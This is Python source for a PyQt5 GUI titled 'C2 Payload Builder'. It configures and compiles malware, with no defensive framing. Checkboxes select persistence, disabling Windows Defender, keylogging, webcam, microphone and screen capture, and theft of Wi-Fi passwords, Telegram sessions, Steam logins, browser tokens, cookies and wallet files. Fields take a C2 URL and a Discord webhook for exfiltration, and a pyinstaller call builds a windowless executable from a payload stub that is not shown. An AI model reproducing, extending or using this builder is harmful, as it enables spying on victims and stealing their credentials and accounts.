import sys, json, subprocess, os
from PyQt5.QtWidgets import *
from PyQt5.QtCore import Qt

class BuilderGUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("C2 Payload Builder")
        self.setGeometry(100, 100, 720, 850)
        central = QWidget()
        layout = QVBoxLayout()

        features_group = QGroupBox("Features")
        features_layout = QVBoxLayout()
        self.cb_persist = QCheckBox("Persistence")
        self.cb_defender = QCheckBox("Disable Defender")
        self.cb_keylog = QCheckBox("Keylogger")
        self.cb_webcam = QCheckBox("Webcam")
        self.cb_screenshot = QCheckBox("Screenshot")
        self.cb_screenrec = QCheckBox("Screen Recording")
        self.cb_mic = QCheckBox("Microphone")
        self.cb_file_search = QCheckBox("File Search")
        self.cb_wifi = QCheckBox("Wi-Fi Passwords")
        self.cb_clipboard = QCheckBox("Clipboard")
        self.cb_history = QCheckBox("Browser History")
        self.cb_telegram = QCheckBox("Telegram Sessions")
        self.cb_steam = QCheckBox("Steam Login")
        self.cb_tokens = QCheckBox("Tokens + Cookies + Roblox")
        for cb in [self.cb_persist, self.cb_defender, self.cb_keylog, self.cb_webcam,
                   self.cb_screenshot, self.cb_screenrec, self.cb_mic, self.cb_file_search,
                   self.cb_wifi, self.cb_clipboard, self.cb_history, self.cb_telegram,
                   self.cb_steam, self.cb_tokens]:
            features_layout.addWidget(cb)
        features_group.setLayout(features_layout)

        params_group = QGroupBox("C2 Parameters")
        params_layout = QFormLayout()
        self.c2_url = QLineEdit("http://localhost:5000")
        self.webhook = QLineEdit("https://discord.com/api/webhooks/...")
        self.poll_interval = QLineEdit("30")
        self.file_exts = QLineEdit(".txt,.doc,.pdf,.jpg,.wallet")
        self.max_file_size = QLineEdit("10")
        self.record_seconds = QLineEdit("30")
        params_layout.addRow("C2 URL:", self.c2_url)
        params_layout.addRow("Webhook:", self.webhook)
        params_layout.addRow("Poll interval (s):", self.poll_interval)
        params_layout.addRow("File extensions:", self.file_exts)
        params_layout.addRow("Max file size (MB):", self.max_file_size)
        params_layout.addRow("Record seconds:", self.record_seconds)
        params_group.setLayout(params_layout)

        output_group = QGroupBox("Output")
        output_layout = QHBoxLayout()
        self.output_file = QLineEdit("payload.exe")
        output_layout.addWidget(QLabel("Filename:"))
        output_layout.addWidget(self.output_file)
        output_group.setLayout(output_layout)

        self.build_btn = QPushButton("Build Payload")
        self.build_btn.clicked.connect(self.build_payload)

        layout.addWidget(features_group)
        layout.addWidget(params_group)
        layout.addWidget(output_group)
        layout.addWidget(self.build_btn)
        central.setLayout(layout)
        self.setCentralWidget(central)

    def build_payload(self):
        config = {
            "c2_url": self.c2_url.text(),
            "webhook": self.webhook.text(),
            "poll_interval": int(self.poll_interval.text()),
            "persist": self.cb_persist.isChecked(),
            "disable_defender": self.cb_defender.isChecked(),
            "keylog": self.cb_keylog.isChecked(),
            "webcam": self.cb_webcam.isChecked(),
            "screenshot": self.cb_screenshot.isChecked(),
            "screenrec": self.cb_screenrec.isChecked(),
            "mic": self.cb_mic.isChecked(),
            "file_search": self.cb_file_search.isChecked(),
            "wifi": self.cb_wifi.isChecked(),
            "clipboard": self.cb_clipboard.isChecked(),
            "history": self.cb_history.isChecked(),
            "telegram": self.cb_telegram.isChecked(),
            "steam": self.cb_steam.isChecked(),
            "tokens": self.cb_tokens.isChecked(),
            "file_exts": self.file_exts.text(),
            "max_file_size_mb": int(self.max_file_size.text()),
            "record_seconds": int(self.record_seconds.text())
        }
        with open("payload_stub.py", "r") as f:
            stub = f.read()
        stub = f"CONFIG = {json.dumps(config, indent=4)}\n\n" + stub
        with open("payload_compiled.py", "w") as f:
            f.write(stub)
        subprocess.run(["pyinstaller", "--onefile", "--noconsole", "payload_compiled.py", "-o", self.output_file.text()])
        QMessageBox.information(self, "Done", f"Payload saved as {self.output_file.text()}")

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = BuilderGUI()
    window.show()
    sys.exit(app.exec_())
